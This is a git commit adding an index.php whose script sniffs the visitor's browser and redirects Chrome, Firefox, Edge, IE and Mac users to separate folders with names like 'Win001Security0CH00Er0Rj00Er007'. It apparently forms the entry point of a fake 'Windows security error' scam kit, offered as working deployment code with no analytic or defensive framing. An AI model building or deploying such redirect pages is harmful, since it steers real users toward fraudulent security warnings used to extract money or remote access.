e95a9d58a6f4c40923df6ddd3752079d9e3023de
madmaxxmad <madmaxxmad87@gmail.com>
2023-04-12 14:19:32 +0530

    first commit

---
+++ bkhfnv3kvnx/index.php
@@ -0,0 +1,35 @@
+<script type="text/javascript">
+var isChromium = window.chrome,
+	vendorName = window.navigator.vendor,
+	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
+
+if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+	// is Google chrome
+window.location.href = "./Win001Security0CH00Er0Rj00Er007/index.php";
+}
+if(navigator.userAgent.indexOf("Firefox") != -1 )
+	{
+			 window.location.href = "./Win001Security0FF00Er0Rj00Er007/index.php";
+	}
+
+	if(window.navigator.userAgent.indexOf("dg") != -1 )
+		{
+				 window.location.href = "./Win001Security0ECH00Er0Rj00Er007/index.php";
+		}
+
+if(window.navigator.userAgent.indexOf("Edge") != -1 )
+	{
+			 window.location.href = "./Win001Security0IED00Er0Rj00Er007/index.php";
+	}
+if(window.navigator.userAgent.indexOf("Mac") != -1 )
+	{
+			 window.location.href = "./Win001Security0MA00Er0Rj00Er007/index.php";
+	}
+if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+	{
+		window.location.href = "./Win001Security0IED00Er0Rj00Er007/index.php";
+	}
+$SAFARI_URL = "apple";
+</script>
